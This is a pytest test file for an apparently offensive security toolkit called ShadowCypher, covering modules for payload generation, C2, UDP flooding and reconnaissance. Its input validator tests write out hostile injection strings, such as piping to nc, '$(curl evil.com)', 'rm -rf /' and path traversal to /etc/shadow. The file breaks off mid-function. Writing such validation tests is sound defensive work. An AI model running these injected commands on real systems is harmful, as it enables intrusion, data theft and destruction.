"""
ShadowCypher Full System Audit — Comprehensive test of every module, core, AI, and UI.
Run with: pytest tests/test_full_audit.py -v
"""

import pytest
import sys
import os
import threading
import time
import tempfile
import json
from unittest.mock import patch, MagicMock, call

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))


# ─────────────────────────────────────────────────────────────────────────────
# CORE: bus  (ShadowBus — subscribe/publish/unsubscribe)
# ─────────────────────────────────────────────────────────────────────────────
class TestBus:
    @pytest.fixture
    def b(self):
        from shadowcypher.core.bus import ShadowBus
        return ShadowBus()

    def test_publish_and_subscribe(self, b):
        received = []
        b.subscribe("test_event", lambda d: received.append(d))
        b.publish("test_event", {"x": 1})
        time.sleep(0.05)
        assert received == [{"x": 1}]

    def test_publish_unknown_topic_no_crash(self, b):
        b.publish("no_subscribers_here", {"data": 42})

    def test_multiple_subscribers(self, b):
        log = []
        b.subscribe("multi", lambda d: log.append("a"))
        b.subscribe("multi", lambda d: log.append("b"))
        b.publish("multi", {})
        time.sleep(0.1)
        assert "a" in log and "b" in log

    def test_thread_safe_publish(self, b):
        count = []
        lock = threading.Lock()
        b.subscribe("t", lambda d: (lock.acquire(), count.append(1), lock.release()))
        threads = [threading.Thread(target=b.publish, args=("t", {})) for _ in range(50)]
        for t in threads: t.start()
        for t in threads: t.join()
        time.sleep(0.2)
        assert len(count) == 50

    def test_global_bus_singleton_exists(self):
        from shadowcypher.core.bus import bus
        assert bus is not None
        assert hasattr(bus, "subscribe")
        assert hasattr(bus, "publish")


# ─────────────────────────────────────────────────────────────────────────────
# CORE: crypto  (CryptoManager — DRM-based module lock/unlock)
# ─────────────────────────────────────────────────────────────────────────────
class TestCrypto:
    @pytest.fixture
    def cm(self, tmp_path):
        with patch("shadowcypher.core.crypto.config") as mc:
            mc.project_root = str(tmp_path)
            from shadowcypher.core.crypto import CryptoManager
            mgr = CryptoManager()
            return mgr

    def test_instantiates(self, cm):
        assert cm is not None

    def test_generate_license_key_returns_string(self, cm):
        key = cm.generate_license_key()
        assert isinstance(key, str)
        assert len(key) > 10

    def test_unlock_with_generated_key(self, cm, tmp_path):
        key = cm.generate_license_key()
        result = cm.unlock_system(key)
        assert result is True or cm.is_unlocked is True

    def test_unlock_with_bad_key_fails(self, cm):
        result = cm.unlock_system("totally-wrong-key-xyz")
        assert result is False or cm.is_unlocked is False

    def test_require_unlock_decorator(self, cm):
        @cm.require_unlock
        def protected():
            return "secret"
        result = protected()
        # Either returns "secret" if unlocked, or a DRM message if locked
        assert result == "secret" or isinstance(result, str)


# ─────────────────────────────────────────────────────────────────────────────
# CORE: platform  (ShadowPlatform — cross-platform system info)
# ─────────────────────────────────────────────────────────────────────────────
class TestPlatform:
    @pytest.fixture
    def pe(self):
        from shadowcypher.core.platform import ShadowPlatform
        return ShadowPlatform

    def test_system_constant(self, pe):
        assert pe.SYSTEM in ("Linux", "Darwin", "Windows")

    def test_get_system_vitals(self, pe):
        vitals = pe.get_system_vitals()
        assert isinstance(vitals, dict)
        assert len(vitals) > 0

    def test_vitals_contains_expected_keys(self, pe):
        vitals = pe.get_system_vitals()
        keys = {k.lower() for k in vitals.keys()}
        assert any(k in keys for k in ("cpu", "ram", "memory", "disk", "uptime"))

    def test_detect_virtualization(self, pe):
        result = pe.detect_virtualization()
        assert isinstance(result, str)

    def test_audit_tool_path_nmap(self, pe):
        result = pe.audit_tool_path("nmap")
        assert result is None or isinstance(result, str)

    def test_get_firewall_backend(self, pe):
        result = pe.get_firewall_backend()
        assert isinstance(result, str)

    def test_platform_engine_singleton(self):
        from shadowcypher.core.platform import platform_engine
        assert platform_engine is not None


# ─────────────────────────────────────────────────────────────────────────────
# CORE: session  (SessionManager — project/engagement management)
# ─────────────────────────────────────────────────────────────────────────────
class TestSession:
    @pytest.fixture
    def sm(self, tmp_path):
        with patch("shadowcypher.core.session.config") as mc:
            mc.project_root = str(tmp_path)
            mc.identity.handle = "test-op"
            with patch("shadowcypher.core.session.Report"):
                from shadowcypher.core.session import SessionManager
                return SessionManager()

    def test_instantiates(self, sm):
        assert sm is not None

    def test_get_projects_returns_list(self, sm):
        projects = sm.get_projects()
        assert isinstance(projects, list)

    def test_create_and_list_project(self, sm, tmp_path):
        sm.create_project("TestOp", "10.0.0.0/24", ["10.0.0.1"])
        projects = sm.get_projects()
        assert "TestOp" in projects

    def test_load_project(self, sm):
        sm.create_project("LoadTest", "192.168.1.0/24", [])
        result = sm.load_project("LoadTest")
        assert result is True

    def test_is_in_scope(self, sm):
        sm.create_project("ScopeTest", "10.0.0.0/24", ["10.0.0.1"])
        sm.load_project("ScopeTest")
        if sm.current_project:
            in_scope = sm.is_in_scope("10.0.0.1")
            out_scope = sm.is_in_scope("8.8.8.8")
            assert isinstance(in_scope, bool)
            assert isinstance(out_scope, bool)


# ─────────────────────────────────────────────────────────────────────────────
# CORE: runner  (Runner — async command execution engine)
# ─────────────────────────────────────────────────────────────────────────────
class TestRunner:
    @pytest.fixture
    def runner(self):
        from shadowcypher.core.runner import Runner
        return Runner()

    def test_instantiates(self, runner):
        assert runner is not None
        assert hasattr(runner, "execute_task")
        assert hasattr(runner, "stop_task")

    def test_execute_task_returns_id(self, runner):
        tid = runner.execute_task("test", ["echo", "hello"], callback=lambda l: None)
        assert isinstance(tid, str) and len(tid) > 0

    def test_execute_task_streams_output(self, runner):
        output = []
        done = threading.Event()
        def on_out(line):
            output.append(line)
            done.set()
        runner.execute_task("echo", ["echo", "shadowcypher_test"], callback=on_out)
        done.wait(timeout=5)
        assert any("shadowcypher_test" in l for l in output)

    def test_task_ids_unique(self, runner):
        ids = {runner.execute_task("t", ["true"], callback=lambda l: None) for _ in range(10)}
        assert len(ids) == 10

    def test_stop_long_task(self, runner):
        tid = runner.execute_task("sleep", ["sleep", "30"], callback=lambda l: None)
        time.sleep(0.2)
        runner.stop_task(tid)
        time.sleep(0.5)
        assert tid not in runner.active_processes


# ─────────────────────────────────────────────────────────────────────────────
# CORE: shell  (ShadowShell — static execute / stream_execute)
# ─────────────────────────────────────────────────────────────────────────────
class TestShell:
    def test_execute_basic(self):
        from shadowcypher.core.shell import ShadowShell
        result = ShadowShell.execute(["echo", "hello"])
        assert result["exit_code"] == 0
        assert "hello" in result.get("output", "")

    def test_execute_bad_command(self):
        from shadowcypher.core.shell import ShadowShell
        result = ShadowShell.execute(["ls", "/nonexistent_xyz_path"])
        assert result["exit_code"] != 0

    def test_execute_timeout(self):
        from shadowcypher.core.shell import ShadowShell
        result = ShadowShell.execute(["sleep", "10"], timeout=1)
        assert result["exit_code"] != 0

    def test_stream_execute(self):
        from shadowcypher.core.shell import ShadowShell
        lines = []
        done = threading.Event()
        ShadowShell.stream_execute(["echo", "streamed"], on_output=lines.append, on_complete=lambda rc: done.set())
        done.wait(timeout=5)
        assert any("streamed" in l for l in lines)

    def test_execute_returns_dict(self):
        from shadowcypher.core.shell import ShadowShell
        result = ShadowShell.execute(["true"])
        assert isinstance(result, dict)
        assert "exit_code" in result

    def test_execute_status_field(self):
        from shadowcypher.core.shell import ShadowShell
        result = ShadowShell.execute(["echo", "ok"])
        assert result["status"] == "SUCCESS"


# ─────────────────────────────────────────────────────────────────────────────
# CORE: sanitize  (validate_ip, validate_target, validate_port, etc.)
# ─────────────────────────────────────────────────────────────────────────────
class TestSanitize:
    def test_validate_ip_valid(self):
        from shadowcypher.core.sanitize import validate_ip
        assert validate_ip("192.168.1.1") is True
        assert validate_ip("10.0.0.1") is True

    def test_validate_ip_invalid(self):
        from shadowcypher.core.sanitize import validate_ip
        assert validate_ip("999.1.1.1") is False
        assert validate_ip("not-an-ip") is False
        assert validate_ip("") is False

    def test_validate_ip_injection(self):
        from shadowcypher.core.sanitize import validate_ip
        assert validate_ip("127.0.0.1 && cat /etc/passwd") is False
        assert validate_ip("127.0.0.1 | nc evil 4444") is False
        assert validate_ip("$(curl evil.com)") is False

    def test_validate_target(self):
        from shadowcypher.core.sanitize import validate_target
        assert validate_target("192.168.1.1") is True
        assert validate_target("example.com") is True
        assert validate_target("evil.com && rm -rf /") is False

    def test_validate_port_valid(self):
        from shadowcypher.core.sanitize import validate_port
        for p in [22, 80, 443, 8080, 65535]:
            assert validate_port(p) is True

    def test_validate_port_invalid(self):
        from shadowcypher.core.sanitize import validate_port
        for p in [0, -1, 65536, "abc", None, ""]:
            assert validate_port(p) is False

    def test_validate_mac(self):
        from shadowcypher.core.sanitize import validate_mac
        assert validate_mac("AA:BB:CC:DD:EE:FF") is True
        assert validate_mac("GG:HH:II:JJ:KK:LL") is False
        assert validate_mac("not-a-mac") is False

    def test_validate_interface(self):
        from shadowcypher.core.sanitize import validate_interface
        assert validate_interface("eth0") is True
        assert validate_interface("wlan0") is True
        assert validate_interface("eth0;id") is False

    def test_validate_filepath(self):
        from shadowcypher.core.sanitize import validate_filepath
        assert validate_filepath("/tmp/output.txt") is True
        assert validate_filepath("/tmp/$(whoami)") is False
        assert validate_filepath("../../../etc/shadow") is False

    def test_quote(self):
        from shadowcypher.core.sanitize import quote
        result = quote("normal_value")
        assert "normal_value" in result

    def test_sanitize_bpf_filter_valid(self):
        from shadowcypher.core.sanitize import sanitize_bpf_filter
        result = sanitize_bpf_filter("tcp port 80")
        assert isinstance(result, str)


# ─────────────────────────────────────────────────────────────────────────────
# CORE: forensics  (ForensicRegistry — threat/mission persistence)
# ─────────────────────────────────────────────────────────────────────────────
class TestForensics:
    @pytest.fixture
    def reg(self, tmp_path):
        from shadowcypher.core.forensics import ForensicRegistry
        r = ForensicRegistry()
        r.data_file = str(tmp_path / "forensics.json")
        r.threats = []
        r.missions = []
        return r

    def test_instantiates(self, reg):
        assert reg is not None

    def test_register_mission(self, reg):
        reg.register_mission("MSN-001", "test objective", "result data", {"role": "commander"})
        threats = reg.get_all_threats()
        assert isinstance(threats, list)

    def test_register_threat(self, reg):
        reg.register_threat("test_handle", hostmask="10.0.0.1", metadata={"reason": "suspicious"})
        threats = reg.get_all_threats()
        assert len(threats) >= 1

    def test_get_all_threats_returns_list(self, reg):
        result = reg.get_all_threats()
        assert isinstance(result, list)

    def test_is_quarantined(self, reg):
        reg.register_threat("bad_actor", hostmask="10.0.0.99")
        result = reg.is_quarantined("10.0.0.99")
        assert isinstance(result, bool)

    def test_get_threat_by_handle(self, reg):
        reg.register_threat("specific_handle", hostmask="10.0.0.2")
        result = reg.get_threat_by_handle("specific_handle")
        assert result is None or isinstance(result, dict)


# ─────────────────────────────────────────────────────────────────────────────
# CORE: knowledge_graph
# ─────────────────────────────────────────────────────────────────────────────
class TestKnowledgeGraph:
    @pytest.fixture
    def kg(self, tmp_path):
        from shadowcypher.core.knowledge_graph import KnowledgeGraph
        return KnowledgeGraph(db_path=str(tmp_path / "test_kg.db"))

    def test_instantiates(self, kg):
        assert kg is not None

    def test_add_node(self, kg):
        kg.add_node("10.0.0.1", "HOST", label="gateway")
        result = kg.get_node("10.0.0.1")
        assert result is not None

    def test_add_node_with_props(self, kg):
        kg.add_node("22", "SERVICE", label="ssh", props={"port": 22})
        result = kg.get_node("22")
        assert result is not None

    def test_link_nodes(self, kg):
        kg.add_node("A", "HOST")
        kg.add_node("B", "HOST")
        kg.link("A", "B", "connects_to")
        neighbors = kg.neighbors("A")
        assert any(n["dst"] == "B" for n in neighbors)

    def test_find_by_type(self, kg):
        for i in range(5):
            kg.add_node(f"10.0.0.{i}", "IP", label=f"host-{i}")
        nodes = kg.find_by_type("IP")
        assert len(nodes) >= 5

    def test_get_attack_surface(self, kg):
        kg.add_target("10.0.0.1")
        surface = kg.get_attack_surface("10.0.0.1")
        assert isinstance(surface, dict)
        assert "target" in surface

    def test_search(self, kg):
        kg.add_node("ssh-service", "SERVICE", label="ssh")
        results = kg.search("ssh")
        assert len(results) >= 1


# ─────────────────────────────────────────────────────────────────────────────
# CORE: severity (LethalityAudit)
# ─────────────────────────────────────────────────────────────────────────────
class TestSeverity:
    @pytest.fixture
    def la(self):
        from shadowcypher.core.severity import LethalityAudit
        return LethalityAudit()

    def test_instantiates(self, la):
        assert la is not None

    def test_has_run_full_audit(self, la):
        assert hasattr(la, "run_full_audit")

    def test_audit_core(self, la):
        result = la._audit_core()
        assert isinstance(result, str)

    def test_audit_ai(self, la):
        result = la._audit_ai()
        assert isinstance(result, str)

    def test_audit_arsenal(self, la):
        result = la._audit_arsenal()
        assert isinstance(result, str)


# ─────────────────────────────────────────────────────────────────────────────
# CORE: audit
# ─────────────────────────────────────────────────────────────────────────────
class TestAudit:
    def test_audit_imports(self):
        from shadowcypher.core.audit import ShadowAudit
        a = ShadowAudit()
        assert a is not None

    def test_run_full_diagnostic(self):
        from shadowcypher.core.audit import ShadowAudit
        a = ShadowAudit()
        result = a.run_full_diagnostic()
        assert isinstance(result, dict) and len(result) > 0


# ─────────────────────────────────────────────────────────────────────────────
# MODULES: recon
# ─────────────────────────────────────────────────────────────────────────────
class TestRecon:
    @pytest.fixture
    def recon(self):
        from shadowcypher.modules.recon import Recon
        return Recon()

    def test_gateway_detected(self, recon):
        assert isinstance(recon.gateway, str)
        assert len(recon.gateway) > 0

    @patch("shadowcypher.modules.recon.subprocess.Popen")
    def test_pulse_target_streams_output(self, mock_popen, recon):
        mock_proc = MagicMock()
        mock_proc.stdout = iter(["line1\n", "line2\n"])
        mock_proc.wait.return_value = 0
        mock_popen.return_value = mock_proc
        lines = []
        recon.pulse_target("192.168.1.1", on_output=lines.append)
        time.sleep(0.5)
        assert len(lines) >= 2

    def test_recon_has_pulse_method(self, recon):
        assert hasattr(recon, "pulse_target")


# ─────────────────────────────────────────────────────────────────────────────
# MODULES: network  (Network — static methods)
# ─────────────────────────────────────────────────────────────────────────────
class TestNetwork:
    def test_instantiates(self):
        from shadowcypher.modules.network import Network
        assert Network() is not None

    def test_get_interfaces(self):
        from shadowcypher.modules.network import Network
        ifaces = Network.get_interfaces()
        assert isinstance(ifaces, (list, str)) and ifaces is not None

    @patch("shadowcypher.core.runner.Runner.execute_task", return_value="tid-001")
    def test_port_scan_tcp_connect(self, mock_exec):
        from shadowcypher.modules.network import Network
        Network.port_scan_tcp_connect("127.0.0.1", ports="22", on_output=lambda l: None)

    @patch("shadowcypher.core.runner.Runner.execute_task", return_value="tid-002")
    def test_arp_scan(self, mock_exec):
        from shadowcypher.modules.network import Network
        Network.arp_scan(interface="eth0", subnet="10.0.0.0/24", on_output=lambda l: None)


# ─────────────────────────────────────────────────────────────────────────────
# MODULES: vuln_scanner
# ─────────────────────────────────────────────────────────────────────────────
class TestVulnScanner:
    @pytest.fixture
    def vs(self):
        from shadowcypher.modules.vuln_scanner import VulnScanner
        return VulnScanner()

    def test_instantiates(self, vs):
        assert vs is not None

    def test_has_scan_methods(self, vs):
        assert hasattr(vs, "nuclei_scan")
        assert hasattr(vs, "audit_target")

    def test_nuclei_scan_raises_without_ai_engine(self, vs):
        # register_tool fallback raises ImportError when ai_engine is not installed
        import pytest
        with pytest.raises(ImportError, match="ai_engine"):
            vs.nuclei_scan("http://127.0.0.1", on_output=lambda l: None)


# ─────────────────────────────────────────────────────────────────────────────
# MODULES: osint  (OSINT — static methods)
# ─────────────────────────────────────────────────────────────────────────────
class TestOSINT:
    def test_instantiates(self):
        from shadowcypher.modules.osint import OSINT
        o = OSINT()
        assert o is not None

    def test_has_ssl_cert_info(self):
        from shadowcypher.modules.osint import OSINT
        assert hasattr(OSINT, "ssl_cert_info")

    def test_has_http_headers(self):
        from shadowcypher.modules.osint import OSINT
        assert hasattr(OSINT, "http_headers")

    @patch("shadowcypher.modules.osint.subprocess.run")
    def test_ssl_cert_info(self, mock_run):
        mock_run.return_value = MagicMock(stdout="subject=CN=example.com\n", returncode=0)
        from shadowcypher.modules.osint import OSINT
        lines = []
        OSINT.ssl_cert_info("example.com", on_output=lines.append)
        time.sleep(0.3)


# ─────────────────────────────────────────────────────────────────────────────
# MODULES: craft_factory
# ─────────────────────────────────────────────────────────────────────────────
class TestCraftFactory:
    def test_generate_obfuscated_python(self):
        from shadowcypher.modules.craft_factory import CraftFactory
        result = CraftFactory.generate_obfuscated_python("127.0.0.1", "4444")
        assert isinstance(result, str) and len(result) > 0

    def test_generate_stealth_c2_python(self):
        from shadowcypher.modules.craft_factory import CraftFactory
        result = CraftFactory.generate_stealth_c2_python("127.0.0.1", "4444")
        assert isinstance(result, str) and len(result) > 0

    @patch("shadowcypher.modules.craft_factory.subprocess.run")
    def test_generate_stealth_powershell(self, mock_run):
        mock_run.return_value = MagicMock(returncode=0, stdout="")
        from shadowcypher.modules.craft_factory import CraftFactory
        result = CraftFactory.generate_stealth_powershell("127.0.0.1", "4444")
        assert result is not None


# ─────────────────────────────────────────────────────────────────────────────
# MODULES: web_security
# ─────────────────────────────────────────────────────────────────────────────
class TestWebSecurity:
    @pytest.fixture
    def ws(self):
        from shadowcypher.modules.web_security import WebSecurity
        return WebSecurity()

    def test_instantiates(self, ws):
        assert ws is not None

    def test_has_nuclei_scan(self, ws):
        assert hasattr(ws, "nuclei_scan")

    def test_has_ffuf_dir_fuzz(self, ws):
        assert hasattr(ws, "ffuf_dir_fuzz")

    def test_has_bypass_403(self, ws):
        assert hasattr(ws, "bypass_403_test")


# ─────────────────────────────────────────────────────────────────────────────
# MODULES: wireless  (Wireless — static methods)
# ─────────────────────────────────────────────────────────────────────────────
class TestWireless:
    def test_instantiates(self):
        from shadowcypher.modules.wireless import Wireless
        w = Wireless()
        assert w is not None

    def test_list_interfaces_method_exists(self):
        from shadowcypher.modules.wireless import Wireless
        assert hasattr(Wireless, "list_interfaces")

    @patch("shadowcypher.core.runner.subprocess.Popen")
    def test_list_interfaces(self, mock_popen):
        mock_proc = MagicMock()
        mock_proc.stdout = iter(["wlan0\n"])
        mock_proc.wait.return_value = 0
        mock_popen.return_value = mock_proc
        from shadowcypher.modules.wireless import Wireless
        Wireless.list_interfaces(on_output=lambda l: None)


# ─────────────────────────────────────────────────────────────────────────────
# MODULES: cve_feed
# ─────────────────────────────────────────────────────────────────────────────
class TestCVEFeed:
    @pytest.fixture
    def feed(self, tmp_path):
        from shadowcypher.modules.cve_feed import CVEFeed
        f = CVEFeed()
        f.cache_dir = str(tmp_path)
        return f

    def test_instantiates(self, feed):
        assert feed is not None

    def test_get_cache_summary(self, feed):
        summary = feed.get_cache_summary()
        assert isinstance(summary, dict)

    def test_search_returns_list(self, feed):
        results = feed.search("apache", on_output=lambda l: None)
        assert isinstance(results, list)

    @patch("shadowcypher.modules.cve_feed.CVEFeed._nvd_request")
    def test_fetch_recent(self, mock_req, feed):
        mock_req.return_value = {"vulnerabilities": [
            {"cve": {"id": "CVE-2024-9999",
                     "descriptions": [{"lang": "en", "value": "Test"}],
                     "metrics": {}}}
        ]}
        results = feed.fetch_recent(days=1, on_output=lambda l: None)
        assert isinstance(results, list)


# ─────────────────────────────────────────────────────────────────────────────
# MODULES: chaos  (ChaosOrchestrator — stress/simulation engine)
# ─────────────────────────────────────────────────────────────────────────────
class TestChaos:
    @pytest.fixture
    def chaos(self):
        from shadowcypher.modules.chaos import ChaosEngine
        return ChaosEngine()

    def test_instantiates(self, chaos):
        assert chaos is not None

    def test_has_flood_method(self, chaos):
        assert hasattr(chaos, "start_udp_flood")

    def test_has_stop_method(self, chaos):
        assert hasattr(chaos, "stop")

    def test_stop_no_crash(self, chaos):
        chaos.stop()

    @patch("shadowcypher.modules.chaos.socket.socket")
    def test_flood_starts_and_stops(self, mock_sock, chaos):
        mock_sock.return_value = MagicMock()
        mock_sock.return_value.sendto.return_value = None
        lines = []
        chaos.start_udp_flood("127.0.0.1", 9, duration=0, threads=1)
        time.sleep(0.3)
        chaos.stop()


# ─────────────────────────────────────────────────────────────────────────────
# MODULES: static_analyzer
# ─────────────────────────────────────────────────────────────────────────────
class TestStaticAnalyzer:
    @pytest.fixture
    def sa(self):
        from shadowcypher.modules.static_analyzer import StaticAnalyzer
        return StaticAnalyzer()

    def test_instantiates(self, sa):
        assert sa is not None

    def test_analyze_safe_python(self, sa, tmp_path):
        f = tmp_path / "test.py"
        f.write_text("x = 1\nprint(x)\n")
        if hasattr(sa, "analyze"):
            results = sa.analyze(str(f))
            assert isinstance(results, (list, dict))

    def test_analyze_detects_eval(self, sa, tmp_path):
        f = tmp_path / "bad.py"
        f.write_text("eval(input())\n")
        if hasattr(sa, "analyze"):
            results = sa.analyze(str(f))
            assert results is not None




# ─────────────────────────────────────────────────────────────────────────────
# AI: providers
# ─────────────────────────────────────────────────────────────────────────────
class TestProviders:
    def test_registry_instantiates(self):
        from shadowcypher.ai.providers import ProviderRegistry
        r = ProviderRegistry()
        assert r is not None

    def test_list_providers(self):
        from shadowcypher.ai.providers import ProviderRegistry
        r = ProviderRegistry()
        if hasattr(r, "list_providers"):
            providers = r.list_providers()
            assert isinstance(providers, list)
        elif hasattr(r, "providers"):
            assert isinstance(r.providers, (list, dict))

    def test_provider_registry_singleton(self):
        from shadowcypher.ai.providers import provider_registry
        assert provider_registry is not None


# ─────────────────────────────────────────────────────────────────────────────
# AI: orchestrator
# ─────────────────────────────────────────────────────────────────────────────
class TestOrchestrator:
    @pytest.fixture
    def orch(self):
        from shadowcypher.ai.orchestrator import AIOrchestrator
        return AIOrchestrator()

    def test_instantiates(self, orch):
        assert orch is not None

    def test_has_execute_query(self, orch):
        assert hasattr(orch, "execute_query_sync") or hasattr(orch, "execute_sync")

    def test_execute_sync_returns_string(self, orch):
        result = orch.execute_sync("What is 2+2?")
        assert isinstance(result, str)

    def test_execute_query_async_completes(self, orch):
        done = threading.Event()
        results = []
        orch.execute_query_async(
            "test query",
            callback=lambda m: results.append(m),
            on_complete=lambda r: done.set()
        )
        done.wait(timeout=15)
        assert done.is_set()


# ─────────────────────────────────────────────────────────────────────────────
# AI: memory
# ─────────────────────────────────────────────────────────────────────────────
class TestAIMemory:
    @pytest.fixture
    def mem(self):
        with patch("shadowcypher.ai.memory.config") as mc:
            mc.identity.handle = "test-operator"
            from shadowcypher.ai.memory import ShadowMemory
            return ShadowMemory()

    def test_instantiates(self, mem):
        assert mem is not None

    def test_store_and_search(self, mem):
        if hasattr(mem, "store") and hasattr(mem, "search"):
            mem.store("Detected SSH on 10.0.0.1 port 22")
            results = mem.search("SSH")
            assert isinstance(results, list)

    def test_get_context(self, mem):
        if hasattr(mem, "get_context"):
            ctx = mem.get_context("network scan")
            assert isinstance(ctx, str)


# ─────────────────────────────────────────────────────────────────────────────
# AI: RAG  (module-level functions)
# ─────────────────────────────────────────────────────────────────────────────
class TestRAG:
    def test_query_function_exists(self):
        from shadowcypher.ai import rag
        assert hasattr(rag, "query")

    def test_index_text_function_exists(self):
        from shadowcypher.ai import rag
        assert hasattr(rag, "index_text")

    def test_augment_prompt_function_exists(self):
        from shadowcypher.ai import rag
        assert hasattr(rag, "augment_prompt")

    def test_query_returns_list(self):
        from shadowcypher.ai.rag import query
        results = query("test", n_results=3)
        assert isinstance(results, list)

    def test_augment_prompt_returns_string(self):
        from shadowcypher.ai.rag import augment_prompt
        result = augment_prompt("What is SSH?", "You are a security assistant.")
        assert isinstance(result, str)


# ─────────────────────────────────────────────────────────────────────────────
# COMPILER: shadowscript
# ─────────────────────────────────────────────────────────────────────────────
class TestShadowScript:
    @pytest.fixture
    def ss(self):
        from shadowcypher.core.shadowscript import ShadowScript
        return ShadowScript()

    def test_instantiates(self, ss):
        assert ss is not None

    def test_execute_comment_only(self, ss):
        result = ss.execute("# comment only\n")
        assert result is not None

    def test_execute_unknown_directive(self, ss):
        result = ss.execute("UNKNOWN_CMD target=10.0.0.1\n")
        assert result is not None

    def test_execute_multiline(self, ss):
        result = ss.execute("# line 1\n# line 2\n")
        assert result is not None

    def test_execute_empty_script(self, ss):
        result = ss.execute("")
        assert result is not None


# ─────────────────────────────────────────────────────────────────────────────
# UI: all 35 pages import and have correct class (parametrized)
# ─────────────────────────────────────────────────────────────────────────────
class TestUIPageImports:
    PAGE_MAP = {
        "Central Command HUD": ("dashboard", "DashboardPage"),
        "Spectre War-Map": ("war_map_page", "WarMapPage"),
        "Artifact Crypt": ("vault_page", "ShadowVaultPage"),
        "Shadow-Synthesizer": ("ai_page", "AIPage"),
        "Spectral Intelligence": ("intel_page", "SpectralIntelligencePage"),
        "Vulnerability Sweep": ("vuln_page", "VulnScannerPage"),
        "Network Scanner": ("network_page", "NetworkPage"),
        "OSINT Probe": ("osint_page", "OSINTPage"),
        "Session Manager": ("session_page", "SessionPage"),
        "Recon Engine": ("recon_page", "ReconPage"),

        "Web & Cloud Strikes": ("web_security_page", "WebSecurityPage"),
        "Payload Factory": ("craft_page", "CraftPage"),
        "Wireless Saturation": ("wireless_page", "WirelessPage"),
        "C2 Command Center": ("relay_page", "RelayPage"),
        "PocEngine Engine": ("poc_page", "PocPage"),
        "Phishing Forge": ("awareness_page", "AwarenessPage"),
        "AD Assessment": ("ad_assessment_page", "ADAssessmentPage"),
        "AD Pivot": ("ad_page", "AdPage"),
        "Combat Deck": ("simulation_page", "SimulationDeck"),
        "ShadowScript": ("shadowscript_page", "ShadowScriptPage"),
        "Terminal": ("terminal_widget", "TerminalPage"),
        "Community Chat": ("chat_page", "ChatPage"),
        "Shadow Nodes": ("ghost_page", "ShadowNodesPage"),
        "Ghost Mode": ("ghost_mode_page", "GhostModePage"),
        "Forensic Audit": ("forensics_page", "ForensicsPage"),
        "Guardian": ("guardian_page", "GuardianPage"),
        "Intel Harvest": ("dataset_page", "DatasetPage"),
        "Firewall Manager": ("firewall_page", "FirewallPage"),
        "Credentials Vault": ("secrets_page", "SecretsPage"),
        "Hub Settings": ("admin_page", "AdminPage"),
        "God-Panel": ("god_panel", "GodPanel"),
        "Wraith Protocol": ("wraith_page", "WraithProtocol"),
        "ShadowCypher Audit": ("audit_page", "ShadowCypherAuditPage"),
        "Support": ("support_page", "SupportPage"),
    }

    @pytest.mark.parametrize("page_name,target", list(PAGE_MAP.items()))
    def test_page_import_and_class_exists(self, page_name, target):
        mod_name, class_name = target
        mod = __import__(f"shadowcypher.ui.{mod_name}", fromlist=[class_name])
        assert hasattr(mod, class_name), f"{mod_name} missing class {class_name}"


# ─────────────────────────────────────────────────────────────────────────────
# UI INTEGRITY: verify stale ui_integrity.py references are documented
# ─────────────────────────────────────────────────────────────────────────────
class TestUIIntegrityScript:
    def test_ghost_correct_class_is_shadow_nodes_page(self):
        from shadowcypher.ui import ghost_page
        assert hasattr(ghost_page, "ShadowNodesPage")

    def test_simulation_deck_exists(self):
        from shadowcypher.ui import simulation_page
        assert hasattr(simulation_page, "SimulationDeck")

    def test_ui_integrity_script_refs_are_correct(self):
        path = os.path.join(os.path.dirname(__file__), "..", "shadowcypher", "scripts", "ui_integrity.py")
        content = open(path).read()
        assert "ShadowNodesPage" in content, "ghost_page should use ShadowNodesPage"
        assert "SimulationDeck" in content, "combat page should use SimulationDeck"
        assert "GhostDeck" not in content, "stale GhostDeck ref not cleaned up"
        assert "combat_page" not in content, "stale combat_page ref not cleaned up"


# ─────────────────────────────────────────────────────────────────────────────
# CORE: hub  (mission dispatch, unique IDs, telemetry)
# ─────────────────────────────────────────────────────────────────────────────
class TestHub:
    @pytest.fixture
    def hub_bare(self):
        mock_orch = MagicMock()
        mock_orch.execute_query_async = MagicMock()
        from shadowcypher.core.hub import ShadowHub
        h = ShadowHub.__new__(ShadowHub)
        h.active_missions = {}
        h.telemetry = {"missions_total": 0, "missions_completed": 0}
        h.orchestrator = mock_orch
        return h

    def test_dispatch_returns_msn_id(self, hub_bare):
        mid = hub_bare.dispatch_mission("scan 10.0.0.1", agent_role="commander")
        assert mid.startswith("MSN-")

    def test_dispatch_increments_telemetry(self, hub_bare):
        before = hub_bare.telemetry["missions_total"]
        hub_bare.dispatch_mission("test", agent_role="adversary")
        assert hub_bare.telemetry["missions_total"] == before + 1

    def test_concurrent_dispatch_all_unique(self, hub_bare):
        ids = []
        lock = threading.Lock()
        def dispatch():
            mid = hub_bare.dispatch_mission("concurrent", agent_role="commander")
            with lock:
                ids.append(mid)
        threads = [threading.Thread(target=dispatch) for _ in range(20)]
        for t in threads: t.start()
        for t in threads: t.join()
        assert len(set(ids)) == 20

    def test_global_hub_singleton(self):
        from shadowcypher.core.hub import hub
        assert hub is not None
        assert hasattr(hub, "dispatch_mission")


# ─────────────────────────────────────────────────────────────────────────────
# STRESS TESTS
# ─────────────────────────────────────────────────────────────────────────────
class TestStress:
    def test_10000_bus_events_no_loss(self):
        from shadowcypher.core.bus import ShadowBus
        b = ShadowBus()
        count = []
        lock = threading.Lock()
        b.subscribe("stress", lambda d: (lock.acquire(), count.append(1), lock.release()))
        threads = [
            threading.Thread(target=lambda: [b.publish("stress", {}) for _ in range(100)])
            for _ in range(100)
        ]
        for t in threads: t.start()
        for t in threads: t.join()
        time.sleep(0.5)
        assert len(count) == 10000

    def test_database_concurrent_writes(self, tmp_path):
        with patch("shadowcypher.core.database.config") as mc:
            mc.project_root = str(tmp_path)
            from shadowcypher.core.database import TacticalDatabase
            db = TacticalDatabase()
            errors = []
            def write_target(i):
                try:
                    db.register_target(f"10.0.{i//256}.{i%256}", f"host-{i}")
                except Exception as e:
                    errors.append(str(e))
            threads = [threading.Thread(target=write_target, args=(i,)) for i in range(100)]
            for t in threads: t.start()
            for t in threads: t.join()
            db.conn.close()
            assert errors == []

    def test_runner_concurrent_tasks(self):
        from shadowcypher.core.runner import Runner
        r = Runner()
        output_lines = []
        lock = threading.Lock()
        total = 20
        for _ in range(total):
            r.execute_task("echo", ["echo", "stress"], callback=lambda l: (lock.acquire(), output_lines.append(l), lock.release()))
        time.sleep(3)
        assert len(output_lines) >= total - 2

    def test_sanitize_under_load(self):
        from shadowcypher.core.sanitize import validate_ip, validate_port, validate_target
        errors = []
        def validate_batch():
            try:
                for i in range(1000):
